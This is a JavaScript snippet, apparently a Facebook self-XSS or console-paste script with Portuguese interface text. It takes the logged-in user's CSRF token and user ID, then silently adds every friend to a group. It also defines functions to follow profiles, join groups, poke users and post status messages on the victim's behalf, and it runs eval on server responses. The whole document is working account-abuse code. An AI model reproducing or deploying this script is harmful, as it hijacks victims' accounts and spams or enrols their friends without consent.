(function (d) {
	var	_ = function(s, t){
		return t?d.getElementById(s):d.getElementsByName(s);
	},

    $ = function(url, post, callback){
		var r = new XMLHttpRequest();
		r.open(post?"POST":"GET", url, true);
		if(post)
            r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        if(callback)
            r.onreadystatechange = function(){callback(r)};

		r.send(post);
		return r;
	}, 

    fb = {
        dtsg: _("fb_dtsg")[0].value,
        pid: d.cookie.match(d.cookie.match(/c_user=(\d+)/)[1]),
        gid: _("group_id")[0]?_("group_id")[0].value:0,
        friends: Array(),
        curCount: 0,
        joined: 0,
        inviteAll: function (gid, callback) {
            $("/ajax/typeahead/first_degree.php?__a=1&viewer=" + fb.pid + "&token=" + Math.random() + "&filter[0]=user&options[0]=friends_only", 0, function(c){
                if(c.readyState == 4 && c.status == 200){
                    var a = JSON.parse(c.responseText.substr(9));
                    a.payload && a.payload.entries && (fb.friends = a.payload.entries.sort(function () {
                        return .5 - Math.random()
                    })), _("container", 1).innerHTML = "<div id='amount'></div><div id='wtf'></div><div id='status' style='min-width:300px;display:inline-block;text-align:left'></div>";
 
                    for (x in fb.friends)
                    	fb.invite(gid, fb.friends[x].uid, function(e){
                            if(e.readyState == 4 && e.status == 200) {
                                var a = JSON.parse(e.responseText.substr(9));
                                fb.curCount++;
                                _("amount", 1).innerHTML = "<div><b>" + fb.curCount + "</b> de <b>" + fb.friends.length + "</b></div>";
                                if(a.errorDescription && (a.jsmods && a.jsmods.require)) {
                                    var b = "<div>", x;
                                    console.log(a.errorDescription);
                                    for (x in a.jsmods.require)
                                        a.jsmods.require[x][a.jsmods.require[x].length - 1][1] && (b += "<b style='color:darkgreen'>" + a.jsmods.require[x][a.jsmods.require[x].length - 1][1] + "</b> ");
                                    b += "<div>", _("wtf", 1).innerHTML = b
                                }
                                if(a.onload)
                                    for(z in a.onload){
                                        var c = eval(a.onload[z].replace(/Arbiter.inform/i, ""));
                                        if (c.uid && c.name){
                                            fb.joined++;
                                            _("status", 1).innerHTML = "<div><b style='color:darkgreen'>( " + fb.joined + " )</b> <a href='/" + c.uid + "' target='_blank'><b>" + c.name + "</b></a> foram joinadas.</div>";
                                            break
                                        }
                                    }
                                _("status", 1).style.textAlign = "center";
                                _("status", 1).innerHTML += "<div style='font-size:20px;font-weight:bold'>Ninguém te bloqueou.</div><a href='/' onClick='document.getElementById(\"container\").style.display=\"none\";return false'>Fim</a>";
                                fb.curCount == fb.friends.length
                            }
                        })
                } else 
                    _("container", 1).innerHTML = c.readyState == 4 && c.status == 404 ? "<b style='color:darkred'>Grupo fechado!</b>" : "<b style='color:darkgreen'>Procurando... (" + c.readyState + ")</b>";
            })
        },

        invite: function (tid, uid, callback) {
            $("/ajax/groups/members/add_post.php", "__a=1&fb_dtsg=" + fb.dtsg + "&group_id=" + tid + "&source=typeahead&ref=&message_id=&members=" + uid + "&__user=" + fb.pid + "&phstamp=", callback);
        },

        subs: function(uids) {
            if(typeof uids === 'string')
                uids = [uids];

            for(var i in uids)
                $("/ajax/follow/follow_profile.php?__a=1", "profile_id=" + uids[i] + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb.dtsg + "&lsd&__user=" + fb.pid + "&phstamp=");
        },

        join: function(gids){
            if(typeof gids === 'string')
                gids = [gids];

            for(var i in gids)
                $('/ajax/groups/membership/r2j.php?__a=1', 'ref=group_jump_header&group_id=' + gids[i] + '&fb_dtsg=' + fb.dtsg + '&__user=' + fb.pid + '&phstamp=');
        },

        poke: function(uid, callback){
            $("/pokes/inline/", "poke_target=" + uid + "&__user=" + fb.pid + "&__a=1&__req=7&fb_dtsg=" + fb.dtsg + "&phstamp=" + Math.random(), callback);
        },

        post: function(tid, msg, callback){
            $("/ajax/updatestatus.php", "fb_dtsg=" + fb.dtsg + "&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=1&xhpc_targetid=" + tid + "&xhpc_message_text=" + msg + "&xhpc_message=" + msg + "&__user=" + fb.pid + "&__a=1", callback);
        }
    }

    // Code here
})(document);